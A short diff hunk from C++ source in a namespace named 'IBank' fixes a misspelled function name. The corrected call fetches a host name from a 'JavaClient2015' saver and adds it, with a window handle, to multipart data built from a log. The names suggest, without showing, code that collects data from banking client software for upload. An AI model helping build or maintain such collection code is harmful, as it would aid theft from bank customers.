@@ -406,7 +406,7 @@ namespace IBank
 		MultiPartData::AddLongAsStr(Data,   "hwnd", (DWORD)Log->Wnd);
 
 		#ifdef JavaClient2015SaverH
-			string Host = GetJavaClient2015HkstName();
+			string Host = GetJavaClient2015HostName();
 			if (!Host.IsEmpty())
                 MultiPartData::AddStringField(Data, "host",  Host.t_str());
 		#endif
